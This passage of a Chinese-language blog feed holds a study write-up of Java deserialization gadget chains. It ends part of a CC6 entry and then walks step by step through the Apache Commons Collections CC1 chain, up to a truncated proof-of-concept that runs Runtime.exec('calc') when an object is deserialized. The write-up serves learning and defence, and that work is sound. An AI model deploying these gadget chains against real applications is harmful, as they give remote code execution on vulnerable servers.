class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>factoryFiled.set(lazyMap,chainedTransformer);<br><br>serialize(map2);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>CC6 </p><p>HashMap.readObject.hash(key)-&gt;HashMap.hash.key.hashCode</p><p>​TiedMapEntry.hashCode.getValue</p><p>​  TiedMapEntry.getValue.map.get(key)</p><p>​LazyMap.get(key).factory.transform(key)</p><p>​  ChainedTransformed.transform</p><p>​  ConstantTransformer.tansform</p><p>​                  InvokerTransformer.tansform</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2025/04/17/CC1/"/>
    <url>/2025/04/17/CC1/</url>
    
    <content type="html"><![CDATA[<p>CC1!</p><span id="more"></span><p><img src="/2025/04/17/CC1/image-20250427210201599-17457589372785.png" alt="image-20250427210201599"></p><h2 id="一-环境"><a href="#一-环境" class="headerlink" title="一.环境"></a>一.环境</h2><ul><li>jdk8u_65</li><li>maven3.2.1</li><li>pom.xml 添加依赖</li><li>修改sun包，这样反编译的class文件就能看到源码了</li></ul><h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="终点分析"><a href="#终点分析" class="headerlink" title="终点分析"></a>终点分析</h3><p>有这么一个类InvokerTransformer它实现接口Transformer（接口Transformer它的作用主要是对传入的对象修饰，类似动态代理增强方法吧），InvokerTransformer类里面的方法transform能实现任意方法的调用(对象input的iMethodName方法)，这是一个危险方法，然后就找哪个方法会调用这个危险方法</p><p><img src="/2025/04/17/CC1/image-20250415193650264-17454123337231.png" alt="image-20250415193650264"></p><p>InvokerTransformer它的构造器是public能直接用，创建对象传参就行，参数有三个，方法的名字，方法的参数类型，参数</p><p><img src="/2025/04/17/CC1/image-20250415193802570-17454123353262.png" alt="image-20250415193802570"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//正常使用InvokerTransformer的方法transform反射执行方法</span><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<span class="hljs-comment">//有参构造器，初始化。传参确定反射执行的方法</span><br>invokerTransformer.transform(r);<br><br></code></pre></td></tr></table></figure><h3 id="阶段一分析"><a href="#阶段一分析" class="headerlink" title="阶段一分析"></a>阶段一分析</h3><blockquote><p>TransformedMap.checkSetValue.transform连接终点的invokerTransformer.transform </p></blockquote><p>找到TransformedMap的checkSetValue()方法调用transform方法</p><p><img src="/2025/04/17/CC1/image-20250414202346176-17454123376563.png" alt="image-20250414202346176"></p><hr><p>要传关键参数valueTransformer</p><blockquote><p>能传参,相同类型原理分析：从构造器那看到valueTransformer与invokerTransformer是相同类型（都相当于接口Transformer类型）.看构造器，知道它是要将接受进来的map的key和value操作，操作在transformer里面，不过构造器是protected的，不能直接new实例化传参</p></blockquote><p><em><strong>有静态方法decorate,通过它也能间接实例化传参</strong></em>（情况有一点点像刚学过的Unsafe调用defineClass时，它也不能直接new实例化，但Unsafe它是用反射获得一个是Unsafe对象的属性来获得实例对象）</p><p><img src="/2025/04/17/CC1/image-20250414202833045-17454123399634.png" alt="image-20250414202833045"></p><p><img src="/2025/04/17/CC1/image-20250414204538985-17454123414185.png" alt="image-20250414204538985"></p><p>decorate它把一个map的key和value装饰了，有三个参数，结合我们的目的:想要连接TransformedMap.checkSetValue.transform 与invokerTransformer.transform 要用到valueTransformer,所以就传个invokerTransformer对象就可以</p><p>所以就有下面的构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br> map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br> Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><p>现在只要调TransformedMap的checkSetValue ,就能触发InvokerTransformer的transform了</p><hr><h3 id="阶段二分析"><a href="#阶段二分析" class="headerlink" title="阶段二分析"></a>阶段二分析</h3><blockquote><p>Map.Entry.setValue.checkSetValue 连接TransformedMap的checkSetValue 进而触发InvokerTransformer的transform</p></blockquote><p>要调TransformedMap的方法checkSetValue</p><blockquote><p>上面checkSetValue.transform(value)的value的控制还与方法的调用有关(value是Runtime类的实例化对象)</p></blockquote><p>找到抽象类AbstractInputCheckedMapDecorator的静态类<strong>MapEntry 中的setValue调了checkSetValue方法</strong>，而且抽象类AbstractInputCheckedMapDecorato是 TransformedMap 的父类</p><p>恰好setValue中的parent是AbstractInputCheckedMapDecorator类型</p><p><strong>表明:parent与TransformedMap,相当于相同类型,可以传参连接</strong></p><p>所以这儿传参将parent赋值成TransformedMap对象，就能调到checkSetValue.InvokerTransformer.transform</p><p><img src="/2025/04/17/CC1/image-20250415220304982-17454123540956.png" alt="image-20250415220304982"></p><p><img src="/2025/04/17/CC1/image-20250415111534344-17454123559247.png" alt="image-20250415111534344"></p><hr><p>然后要调MapEntry的setValue</p><p>遍历hashMap被修饰后的TransformedMap对象,它的键值对Map.Entry对象entry直接调setValue，就会调到MapEntry的setValue再去调checkSetValue</p><p>解释如下：</p><ul><li><p>Map.Entry类的entry 调用MapEntry的setValue方法路径：</p><ul><li><p>Map.Entry的实现类AbstractMapEntryDecorator是抽象类且没有实现这个方法（所以它才是抽象类的嘛），那就可以找继承了这个抽象类的类</p><p>在AbstractInputCheckedMapDecorator中有个类<strong>MapEntry继承</strong>AbstractMapEntryDecorator重写了setValue方法</p><p><img src="/2025/04/17/CC1/image-20250415143721033-17454123591428.png" alt="image-20250415143721033"></p><p>继承关系：<br>接口Map.Entry—-&gt;抽象类AbstractMapEntryDecorator—&gt;实现类MapEntry</p><p><img src="/2025/04/17/CC1/image-20250415143912674-17454123611999.png" alt="image-20250415143912674"></p></li></ul></li></ul><p>setValue传入的r就是checkSetValue中的r,也就是transform中的r</p><p>所以现在的构造为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><span class="hljs-keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;<br>    entry.setValue(r);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="阶段三分析"><a href="#阶段三分析" class="headerlink" title="阶段三分析"></a>阶段三分析</h3><blockquote><p>readObject里面调setValue</p></blockquote><p>AnnotationInvocationHandler的readObject刚好有遍历键值对，调用setValue</p><p>memberValues在构造器中也是可控的，但这个类不是public，不能直接获取</p><p><img src="/2025/04/17/CC1/image-20250416094042779-174541236407110.png" alt="image-20250416094042779"></p><p><img src="/2025/04/17/CC1/image-20250416094159980-174541236547011.png" alt="image-20250416094159980"></p><p>反射获得对象传参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>       Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>       Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>       constructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, transformedMap);<br>       serialize(o);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>我们上面这样的操作能使得在反序列化的时候调用readObject,</p><p>执行：readObject.MapEntry.setvalue（value）—-&gt;TransformedMap.checkSetValue(value)—&gt;InvokerTransformer.transform(value)</p><h4 id="阶段三疑问"><a href="#阶段三疑问" class="headerlink" title="阶段三疑问"></a>阶段三疑问</h4><p> readObject遍历Map类transformedMap的键值对，调它的setValue,就到那个内部类MapEntry重写的setValue，它里面parent.checkSetValue,就调到TransformedMap.checkSetValue为啥parent属性就是入口类反射实例化的时候往构造器里面传的transformedMap</p><p>ai给出的答案：</p><p><img src="/2025/04/17/CC1/image-20250417114316398-174541236802612.png" alt="image-20250417114316398"></p><ul><li><p><code>transformedMap.entrySet()</code> ，返回的是 <strong>包装后的 <code>TransformedMapEntry</code> 对象</strong></p><p>TransformedMapEntry构造器是protected</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map.Entry entry;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TransformedMap parent; <span class="hljs-comment">// 持有父对象引用</span><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMapEntry</span><span class="hljs-params">(Map.Entry entry, TransformedMap parent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.entry = entry;<br>        <span class="hljs-built_in">this</span>.parent = parent; <span class="hljs-comment">// parent 被赋值为外部的 TransformedMap 实例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但迭代器 <code>TransformedEntryIterator</code> 在遍历原始 <code>Map.Entry</code> 时，会将每个原始条目包装为 <code>TransformedMapEntry</code>，并 **显式传入当前 <code>TransformedMap</code> 实例作为 <code>parent</code>**：(在TransformedEntryIterator的next中赋值，使其 <code>parent</code> 指向了 <code>transformedMap</code>。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedEntryIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Iterator iterator;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformedEntryIterator</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>        <span class="hljs-built_in">this</span>.iterator = iterator;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取原始 Entry，并包装为 TransformedMapEntry</span><br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();<br>        <span class="hljs-comment">// 关键点：将当前 TransformedMap 实例（this）作为 parent 传入</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMapEntry</span>(entry, TransformedMap.<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>   <br>&#125;<br></code></pre></td></tr></table></figure><p>所以</p><p>遍历 **<code>entrySet()</code>   返回包装后的 <code>TransformedMapEntry</code>    **   每个 <code>TransformedMapEntry</code> 持有 <code>parent</code></p><p>当调用 TransformedMapEntry.setValue 时，会通过 parent.checkSetValue 调用的 TransformedMap.checkSetValue  </p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="Q"><a href="#Q" class="headerlink" title="Q:"></a>Q:</h4><p>问题1.上面for遍历的时候说setValue中传的r，经过了TransformaedMap.checkSetValue(r)，还有InvokerTransformer.transform(r),传的r是上面Runtime实例化对象r,但是Runtime不能序列化</p><p>问题2.按理说readObject中的setValue()传的应该是TransformedMap，但在这儿不好控制，还有两个if条件</p><p><img src="/2025/04/17/CC1/image-20250416142109348-174541237111513.png" alt="image-20250416142109348"></p><h4 id="解决1"><a href="#解决1" class="headerlink" title="解决1."></a><strong>解决1.</strong></h4><p>Runtime.class       Class类实现Serializable，可以序列化</p><p>Runtime它是java的单例模式，（与unsafe差不多）构造器私有，但有静态方法getRuntime返回实例化对象，</p><p>所以反射获得Runtime对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>Runtime r= (Runtime)getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>换成InvokerTransformerd的写法：</p><ul><li>这里犯了一个错误，直接想new 的时候传getRuntime,这肯定是不行的,这样transform()里面的参数就得是Runtime实例化对象，那不就还是回到这个不能序列化问题，就还没解决这个问题嘛</li></ul><p>所以这儿就是利用这个危险方法transform先调getMethod,再调invoke,反射得到实例化对象再调exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime1</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><span class="hljs-comment">//相当于Method getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;, null);</span><br><br>Runtime r= (Runtime)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntime1);<br><span class="hljs-comment">//相当于Runtime r= (Runtime)getRuntime.invoke(null, null);</span><br><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><span class="hljs-comment">//相当于</span><br><span class="hljs-comment">//Method exec = Runtime.class.getMethod(&quot;exec&quot;, String.class)</span><br><span class="hljs-comment">//exec.invoke(r, &quot;calc&quot;);</span><br></code></pre></td></tr></table></figure><ul><li><p>注意 getMethod方法的第二个参数是Class数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br></code></pre></td></tr></table></figure><p><img src="/2025/04/17/CC1/image-20250418193232618-174541237394814.png" alt="image-20250418193232618"></p></li></ul><p>观察上面的发现，它是循环调用了transform方法，下一个调上一个返回的结果</p><p>ChainedTransformer类中的transform就能实现这个功能，构造器里面传数组Transformer它来调transform()</p><p><img src="/2025/04/17/CC1/image-20250416193209756-174541237541815.png" alt="image-20250416193209756"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>      &#125;;<br>      <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>      chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p>这就解决了Runtime不能序列化的问题</p><p>所以现在的链为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>     <span class="hljs-comment">//  chainedTransformer.transform(Runtime.class);</span><br><br><br>       <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>       map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>       Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>       Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>       Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>       Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>       constructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, transformedMap);<br>       serialize(o);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>但现在readObject中TransformedMap调setValue() 括号中的还没传参（Runtime.class），那两个if判断也还没解决</p><h4 id="解决2"><a href="#解决2" class="headerlink" title="解决2."></a>解决2.</h4><p>先分析readObject中</p><p>memberTypes:注解的成员变量</p><p>name:TransfomerMap的key</p><p>memberType：注解的成员变量且还是key</p><p>memberType不为空才会走进想要的</p><p>所以让memberType不为空：<br>往AnnotationInvocationHandler构造器传参实例化的时候就传有成员变量的注解，且map的key也要是注解的成员变量</p><p>改一下这两处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br></code></pre></td></tr></table></figure><p><strong>传Runtime.class</strong></p><p>现在过了两个if来到了setValue()，它括号里面new的这个就是我们要传的Runtime.class  (先前InvokerTransformer.transform(r） ），现在chainedTransformer.transform(Runtime.class)</p><p><img src="/2025/04/17/CC1/image-20250416205704812-174541237851816.png" alt="image-20250416205704812"></p><p>new的这个不可控，就不在这传了，就用它本来的这样</p><p>ConstantTransformer它的transform方法接受啥就返回啥，与input没有关系，把它直接放到数组transformers中，就返回Runtime.class,开启调用后面的transform</p><p><img src="/2025/04/17/CC1/image-20250416211332023-174541238037117.png" alt="image-20250416211332023"></p><h2 id="三-完整POC"><a href="#三-完整POC" class="headerlink" title="三.完整POC"></a>三.完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span 